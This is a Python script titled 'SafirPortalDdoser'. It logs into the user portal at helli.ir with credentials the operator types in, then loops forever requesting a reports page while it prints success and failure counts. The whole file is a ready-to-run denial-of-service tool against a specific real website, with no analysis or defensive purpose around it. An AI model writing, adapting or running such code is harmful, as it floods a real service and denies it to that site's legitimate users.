import requests
import getpass
import time
import os

class color():
	RED = '\033[31m'
	GREEN = '\033[32m'
	YELLOW = '\033[33m'
	BLUE = '\033[34m'
	BLUE1 = '\033[94m'
	MAGENTA = '\033[35m'
	PURPLE = '\033[1;35;48m'
	CYAN = '\033[36m'
	WHITE = '\033[37m'
	BLACK = '\033[1;30;48m'

def banner():
	print(f'''{color.GREEN}  _____        __ _      _____           _        _ _____      _                     
 / ____|      / _(_)    |  __ \         | |      | |  __ \    | | {color.CYAN}github.com/one-eyed{color.GREEN}
| (___   __ _| |_ _ _ __| |__) |__  _ __| |_ __ _| | |  | | __| | ___  ___  ___ _ __ 
 \___ \ / _` |  _| | '__|  ___/ _ \| '__| __/ _` | | |  | |/ _` |/ _ \/ __|/ _ \ '__|
 ____) | (_| | | | | |  | |  | (_) | |  | || (_| | | |__| | (_| | (_) \__ \  __/ |   
|_____/ \__,_|_| |_|_|  |_|   \___/|_|   \__\__,_|_|_____/ \__,_|\___/|___/\___|_|   \n''')

def clean():
	os.system(['clear', 'cls'][os.name == 'nt'])

def getup():
	try:
		usrnm1 = getpass.getpass(f'{color.BLUE}Type Your Username: {color.BLACK}')
		psswrd1 = getpass.getpass(f'{color.PURPLE}Type Your Password: {color.BLACK}{color.BLACK}')
		return usrnm1, psswrd1
	except KeyboardInterrupt:
		clean()
		banner()
		print(f'{color.RED}Please Type Correct Credentials!')
		getup()

def crmon():
	clean()
	banner()
	usrnm, psswrd = getup()
	formid = requests.get('https://www.helli.ir/portal/user/login').text
	formbuildid = (formid.split('name="form_build_id" value="'))[1].split('"')[0]
	data = {"name":usrnm,"pass":psswrd,"form_build_id":formbuildid,"form_id":"user_login","op":"ورود"}
	login = requests.Session()
	start = login.post('https://www.helli.ir/portal/user/login', data=data)
	if((start.text).find('ارسال های اخیر') != -1):
		print(f'{color.YELLOW}Login Complited!')
		time.sleep(3)
		clean()
		banner()
		print(f'{color.BLUE1}Starting Ddos...')
		time.sleep(2)
		i = 0
		j = 0
		try:
			while(True):
				u = login.get('https://www.helli.ir/ids/reportsview.php')
				if(u.status_code == 200):
					i += 1
					print(f'{color.MAGENTA}Success!', f'{color.BLACK}|{color.YELLOW}', u.elapsed, f'{color.BLACK}|{color.GREEN}', 'Good:', i, f'{color.BLACK}|{color.RED}', 'Bad:', j)
				else:
					j += 1
					print(f'{color.RED}Error!', f'{color.BLACK}|{color.YELLOW}', u.elapsed, f'{color.BLACK}|{color.GREEN}', 'Good:', i, f'{color.BLACK}|{color.RED}', 'Bad:', j)
		except KeyboardInterrupt:
			print(f'{color.RED}Script Stopped!{color.WHITE}')
			exit()
	else:
		print(f'{color.RED}Login Failed!')
		time.sleep(2)
		crmon()

crmon()
